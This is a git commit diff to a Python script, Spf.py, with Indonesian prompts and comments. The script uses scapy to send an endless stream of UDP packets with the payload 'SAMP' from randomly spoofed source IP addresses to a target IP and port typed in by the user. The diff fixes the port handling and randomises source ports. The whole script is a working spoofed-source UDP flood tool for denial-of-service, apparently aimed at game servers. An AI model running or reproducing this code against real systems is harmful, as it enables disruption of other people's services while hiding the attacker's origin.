d3f9986fef68bde505159c40b3473972e2ac8a86
UNV <139604784+UNVF@users.noreply.github.com>
2023-09-17 06:45:59 +0700

    Update Spf.py

--- Spf.py
+++ Spf.py
@@ -2,7 +2,7 @@ import random
 from scapy.all import *
 
 target_IP = input("Masukkan alamat IP target: ")
-port_target = input("Masukkan port target: ")
+target_port = int(input("Masukkan port target: "))  # Menggunakan int() untuk mengonversi input ke integer
 i = 1
 
 while True:
@@ -13,12 +13,13 @@ while True:
     dot = "."
     source_IP = a + dot + b + dot + c + dot + d
 
-    for source_port in range(1, 65535):
-        payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
-        IP1 = IP(src=source_IP, dst=target_IP)
-        UDP1 = UDP(sport=source_port, dport=port_target)
-        pkt = IP1 / UDP1 / Raw(load=payload)
-        send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik
+    # Menggunakan port target yang telah diinputkan
+    payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
+    IP1 = IP(src=source_IP, dst=target_IP)
+    UDP1 = UDP(sport=random.randint(1024, 65535), dport=target_port)  # Menggunakan port target yang telah diinputkan
+    pkt = IP1 / UDP1 / Raw(load=payload)
+    send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik
 
-        print("Paket terkirim", i)
-        i = i + 1
+    print("Paket terkirim", i)
+    i = i + 1
+￼Enter
